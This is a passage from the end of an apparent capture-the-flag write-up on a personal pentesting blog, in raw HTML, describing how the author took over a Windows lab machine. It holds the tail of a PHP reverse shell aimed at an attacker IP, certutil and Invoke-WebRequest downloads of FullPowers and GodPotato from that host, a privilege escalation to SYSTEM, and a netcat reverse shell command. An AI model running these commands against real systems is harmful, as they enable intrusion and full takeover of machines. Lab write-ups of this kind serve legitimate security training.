</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>                <span class=nx>fclose</span><span class=p>(</span><span class=nv>$socket</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=c1>// ------ SOCKET END ------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1>// change the host address and/or port number as necessary
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$sh</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Shell</span><span class=p>(</span><span class=s1>&#39;10.10.16.6&#39;</span><span class=p>,</span> <span class=mi>4000</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$sh</span><span class=o>-&gt;</span><span class=na>run</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>unset</span><span class=p>(</span><span class=nv>$sh</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// garbage collector requires PHP v5.3.0 or greater
</span></span></span><span class=line><span class=cl><span class=c1>// @gc_collect_cycles();
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>where, again, <code>10.10.16.6</code> is my attacker IP and <code>4000</code> is the port I will start listening with <code>nc</code>.</p><ul><li>I start a <code>Python</code> <code>HTTP</code> server on port <code>80</code> in the same directory where <code>revshell.php</code> is located</li><li>I start a <code>nc</code> listener on port <code>4000</code>. Then, on the reverse shell obtained with <code>Nishang</code>, I run:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Windows\Temp\8f8177df5fbf8e4d3d0385b74ece7f\trying media&gt; Invoke-WebRequest -Uri http://10.10.16.6/revshell.php -OutFile C:\xampp\htdocs\uploads\revshell.php
</span></span></span></code></pre></div><p>and write the file where the <code>HTTP</code> server usually locates its files in <code>Windows</code>, at <code>C:\xampp\htdocs</code>.</p><ul><li>I can trigger this reverse shell with:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>curl http://10.10.11.234/uploads/revshell.php
</span></span></span></code></pre></div><p>and I get a reverse shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>rlwrap nc -lvnp 4000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 4000 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.234] 49691
</span></span></span><span class=line><span class=cl><span class=go>SOCKET: Shell has connected! PID: 4352
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.17763.4851]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\xampp\htdocs\uploads&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go>nt authority\local service
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\xampp\htdocs\uploads&gt;
</span></span></span></code></pre></div><p>but, as can we see here, now we are the user <code>nt authority\local service</code>.</p><ul><li>From the new shell, I download <code>FullPowers</code> from its <a href=https://github.com/itm4n/FullPowers class=external-link target=_blank rel=noopener>oficial repository</a> using <code>certutil</code> (after serving, again, a <code>Python</code> <code>HTTP</code> server on port <code>80</code>):</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Windows\Temp&gt;cd C:\Users\Public\Downloads
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\Public\Downloads&gt;certutil.exe -urlcache -split -f http://10.10.16.6/FullPowers.exe .\FullPowers.exe
</span></span></span><span class=line><span class=cl><span class=go>****  Online  ****
</span></span></span><span class=line><span class=cl><span class=go>  0000  ...
</span></span></span><span class=line><span class=cl><span class=go>  9000
</span></span></span><span class=line><span class=cl><span class=go>CertUtil: -URLCache command completed successfully.
</span></span></span></code></pre></div><p>and we pass from this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;whoami /priv
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PRIVILEGES INFORMATION
</span></span></span><span class=line><span class=cl><span class=go>----------------------
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Privilege Name                Description                    State
</span></span></span><span class=line><span class=cl><span class=go>============================= ============================== ========
</span></span></span><span class=line><span class=cl><span class=go>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeCreateGlobalPrivilege       Create global objects          Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
</span></span></span></code></pre></div><p>to this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;.\FullPowers.exe
</span></span></span><span class=line><span class=cl><span class=go>[+] Started dummy thread with id 1888
</span></span></span><span class=line><span class=cl><span class=go>[+] Successfully created scheduled task.
</span></span></span><span class=line><span class=cl><span class=go>[+] Got new token! Privilege count: 7
</span></span></span><span class=line><span class=cl><span class=go>[+] CreateProcessAsUser() OK
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.17763.4851]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Windows\system32&gt;whoami /priv
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PRIVILEGES INFORMATION
</span></span></span><span class=line><span class=cl><span class=go>----------------------
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Privilege Name                Description                               State
</span></span></span><span class=line><span class=cl><span class=go>============================= ========================================= =======
</span></span></span><span class=line><span class=cl><span class=go>SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeAuditPrivilege              Generate security audits                  Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeImpersonatePrivilege        Impersonate a client after authentication Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeCreateGlobalPrivilege       Create global objects                     Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
</span></span></span></code></pre></div><p>so we have enabled the <code>SeImpersonatePrivilege</code>, which can be abused to escalate privileges.</p><ul><li>Note that we are in <code>C:\Windows\system32</code> folder after we use <code>FullPowers</code>, so I move again to a directory where we actually can write files like <code>C:\Users\Public\Desktop\Downloads</code>.</li><li>Finally, I pass <code>netcat</code> binary for <code>Windows</code>, and <code>JuicyPotato</code> using <code>certutil</code> to abuse <code>SeImpersonatePrivilege</code>. But they did not work (so do not lose your time).</li><li>Next, I will try to use <code>GodPotato</code>. In its <a href=https://github.com/BeichenDream/GodPotato class=external-link target=_blank rel=noopener>Github repository</a>. we have different binaries for different <code>.NET</code> versions. To check which version we have to download, I run in the victim machine:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;reg query &#34;HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\CDF
</span></span></span><span class=line><span class=cl><span class=go>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4
</span></span></span><span class=line><span class=cl><span class=go>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4.0
</span></span></span></code></pre></div><p>so we need to download <code>NET4</code> version.</p><ul><li>Once downloaded I pass it to the target machine and check if this works:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;certutil.exe -urlcache -split -f http://10.10.16.6/godpotato-net4.exe .\godpotato.exe
</span></span></span><span class=line><span class=cl><span class=go>****  Online  ****
</span></span></span><span class=line><span class=cl><span class=go>  0000  ...
</span></span></span><span class=line><span class=cl><span class=go>  e000
</span></span></span><span class=line><span class=cl><span class=go>CertUtil: -URLCache command completed successfully.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\Public\Downloads&gt;.\godpotato -cmd &#34;cmd /c whoami&#34;
</span></span></span><span class=line><span class=cl><span class=go>[*] CombaseModule: 0x140715858722816
</span></span></span><span class=line><span class=cl><span class=go>[*] DispatchTable: 0x140715861028976
</span></span></span><span class=line><span class=cl><span class=go>[*] UseProtseqFunction: 0x140715860405152
</span></span></span><span class=line><span class=cl><span class=go>[*] UseProtseqFunctionParamCount: 6
</span></span></span><span class=line><span class=cl><span class=go>[*] HookRPC
</span></span></span><span class=line><span class=cl><span class=go>[*] Start PipeServer
</span></span></span><span class=line><span class=cl><span class=go>[*] CreateNamedPipe \\.\pipe\79e3465c-95bf-41d8-9539-53f788c911a2\pipe\epmapper
</span></span></span><span class=line><span class=cl><span class=go>[*] Trigger RPCSS
</span></span></span><span class=line><span class=cl><span class=go>[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
</span></span></span><span class=line><span class=cl><span class=go>[*] DCOM obj IPID: 00009802-10ac-ffff-d1e0-c475845222f4
</span></span></span><span class=line><span class=cl><span class=go>[*] DCOM obj OXID: 0xf22c1c8cc040bd7
</span></span></span><span class=line><span class=cl><span class=go>[*] DCOM obj OID: 0xa93e722cc15a4aa
</span></span></span><span class=line><span class=cl><span class=go>[*] DCOM obj Flags: 0x281
</span></span></span><span class=line><span class=cl><span class=go>[*] DCOM obj PublicRefs: 0x0
</span></span></span><span class=line><span class=cl><span class=go>[*] Marshal Object bytes len: 100
</span></span></span><span class=line><span class=cl><span class=go>[*] UnMarshal Object
</span></span></span><span class=line><span class=cl><span class=go>[*] Pipe Connected!
</span></span></span><span class=line><span class=cl><span class=go>[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
</span></span></span><span class=line><span class=cl><span class=go>[*] CurrentsImpersonationLevel: Impersonation
</span></span></span><span class=line><span class=cl><span class=go>[*] Start Search System Token
</span></span></span><span class=line><span class=cl><span class=go>[*] PID : 884 Token:0x644  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
</span></span></span><span class=line><span class=cl><span class=go>[*] Find System Token : True
</span></span></span><span class=line><span class=cl><span class=go>[*] UnmarshalObject: 0x80070776
</span></span></span><span class=line><span class=cl><span class=go>[*] CurrentUser: NT AUTHORITY\SYSTEM
</span></span></span><span class=line><span class=cl><span class=go>[*] process start with pid 1692
</span></span></span><span class=line><span class=cl><span class=go>nt authority\system
</span></span></span></code></pre></div><p>and it does, so I throw a reverse using the <code>netcat</code> binary I have already transferred to the machine when I tried to use <code>JuicyPotato</code> (but failed).</p><ul><li>I start a <code>netcat</code> listener on port <code>443</code> and run in the victim machine:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;.\godpotato -cmd &#34;cmd /c C:\Users\Public\Downloads\nc.exe 10.10.16.6 443 -e cmd&#34;
</span></span></span></code></pre></div><p>and I get a reverse shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.234] 49726
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.17763.4851]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\Public\Downloads&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>nt authority\system
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\Public\Downloads&gt;
</span></span></span></code></pre></div><p>We can get the flag at Administrator&rsquo;s desktop.</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>